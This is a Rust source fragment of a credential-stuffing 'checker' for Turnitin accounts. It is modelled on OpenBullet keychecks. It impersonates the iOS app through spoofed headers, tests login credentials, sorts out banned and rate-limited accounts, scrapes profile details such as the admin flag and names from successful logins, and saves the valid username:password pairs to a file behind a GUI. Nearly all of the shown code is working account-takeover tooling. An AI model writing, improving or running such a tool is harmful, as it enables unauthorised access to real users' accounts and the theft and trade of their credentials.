    headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
    headers.insert(HOST, HeaderValue::from_static("ios.turnitin.com"));
    headers.insert("User-Agent", HeaderValue::from_static("Turnitin/1433 CFNetwork/1494.0.7 Darwin/23.4.0"));
    headers.insert("X-Integration-ID", HeaderValue::from_static("23"));
    headers.insert("X-ios-Version", HeaderValue::from_static("17.4.1"));
    headers.insert("X-iPad-Version", HeaderValue::from_static("iPhone16,1"));
    headers.insert("X-Turnitin-App-Version", HeaderValue::from_static("3.2.5"));
    
    let login_response = client
        .get("https://ios.turnitin.com/login")
        .headers(headers.clone())
        .send()
        .await?;
    
    let login_text = login_response.text().await?;
    
    // Check login response exactly as in OpenBullet Keycheck
    if login_text.contains("failed user/pass match") {
        return Err(AppError::AuthFailed);
    }
    
    if login_text.contains("account has been suspended") || login_text.contains("banned") {
        return Err(AppError::Banned);
    }
    
    if login_text.contains("rate limit exceeded") || login_text.contains("too many requests") {
        return Err(AppError::RateLimited);
    }
    
    let success = login_text.contains("is_us_user") || !login_text.contains("failed user/pass match");
    
    if !success {
        return Err(AppError::AuthFailed);
    }
    
    let status = "SUCCESS".to_string();
    
    let profile_response = client
        .get("https://ios.turnitin.com/profile")
        .headers(headers)
        .send()
        .await?;
    
    let profile_text = profile_response.text().await?;
    
    #[cfg(debug_assertions)]
    eprintln!("Profile response for {}: {}", credential.username, profile_text);
    
    if profile_text.contains("Invalid authentication") {
        return Err(AppError::AuthFailed);
    }
    
    let mut obj = serde_json::Map::new();
    
    if let Some(is_admin) = extract_value(&profile_text, "\"is_admin\":", ",") {
        obj.insert("is_admin".to_string(), Value::String(is_admin));
    }
    
    if let Some(user_type) = extract_value(&profile_text, "default_user_type\":", ",") {
        obj.insert("default_user_type".to_string(), Value::String(user_type));
    }
    
    if let Some(first_name) = extract_value(&profile_text, "first_name\":\"", "\"") {
        obj.insert("first_name".to_string(), Value::String(first_name));
    }
    
    if let Some(last_name) = extract_value(&profile_text, "last_name\":\"", "\"") {
        obj.insert("last_name".to_string(), Value::String(last_name));
    }
    
    if obj.is_empty() {
        return Err(AppError::ParseError("Failed to extract any profile data".to_string()));
    }
    
    Ok((status, Some(Value::Object(obj))))
}

fn save_results_to_csv(results: &[TurnitinResult], output_path: &str) -> Result<()> {
    use std::fs::File;
    use std::io::{Write, BufWriter};
    
    let file = File::create(output_path).context("Failed to create output file")?;
    let mut writer = BufWriter::new(file);
    
    for result in results {
        if result.status == "SUCCESS" {
            let is_admin = result.is_admin.as_deref().unwrap_or("").trim_matches('"');
            let default_user_type = result.default_user_type.as_deref().unwrap_or("").trim_matches('"');
            let first_name = result.first_name.as_deref().unwrap_or("");
            let last_name = result.last_name.as_deref().unwrap_or("");
            let timestamp = result.timestamp.as_deref().unwrap_or("");
            
            let output_line = format!(
                "{}:{} | Is_Admin = {} | default_user_type = {} | FirstName = {} | LastName = {} | Timestamp = {}\n",
                result.username,
                result.password,
                is_admin,
                default_user_type,
                first_name,
                last_name,
                timestamp
            );
            writer.write_all(output_line.as_bytes())?;
            
            println!("{}", output_line.trim());
        }
    }
    
    writer.flush()?;
    println!("Results saved to {}", output_path);
    Ok(())
}

fn main() -> Result<()> {
    env_logger::init();
    
    let rt = Runtime::new().context("Failed to create Tokio runtime")?;
    
    let _guard = rt.enter();
    
    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_inner_size([900.0, 700.0])
            .with_min_inner_size([640.0, 480.0])
            .with_title(format!("{} v{}", APP_NAME, APP_VERSION)),
        ..Default::default()
    };
    
    eframe::run_native(
        &format!("{} v{}", APP_NAME, APP_VERSION),
        options,
        Box::new(|_cc| Box::<TurnitinApp>::default()),
    )
    .map_err(|e| anyhow::anyhow!("Error running app: {}", e))?;
    
    Ok(())
}
